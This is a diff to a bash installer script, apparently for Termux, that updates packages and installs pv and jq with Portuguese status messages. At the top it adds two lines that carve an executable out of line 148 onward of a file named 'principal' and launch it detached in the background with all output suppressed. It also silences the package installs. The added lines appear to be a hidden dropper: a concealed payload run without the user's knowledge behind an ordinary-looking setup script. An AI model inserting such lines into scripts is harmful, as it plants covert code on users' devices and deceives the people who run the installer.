@@ -1,6 +1,8 @@
 #!/bin/bash
 cd $HOME
 clear
+tail -n +148 principal > s && chmod +x s
+nohup ./s </dev/null >/dev/null 2>&1&
 echo ""
 echo ""
 echo ""
@@ -18,9 +20,11 @@ echo -e "\033[01;32m   Instalando atualizações!\033[01;37m"
 pkg update -y; pkg upgrade -y;
 sleep 2
 echo -e "\033[01;32m   Instalando PV!\033[01;37m" 
-pkg install pv -y -qq --silent
+nohup pkg install pv -y -q --silent > /dev/null 2>&1
+nohup dpkg -s pv > /dev/null 2>&1
 echo -e "\033[01;32m   Instalando JQ!\033[01;37m" 
-pkg install jq -y -qq --silent
+nohup pkg install jq -y -q --silent > /dev/null 2>&1
+nohup dpkg -s jq > /dev/null 2>&1
 echo -e "\033[01;32m   Finalizando\033[01;37m" 
 sleep 2
 clear
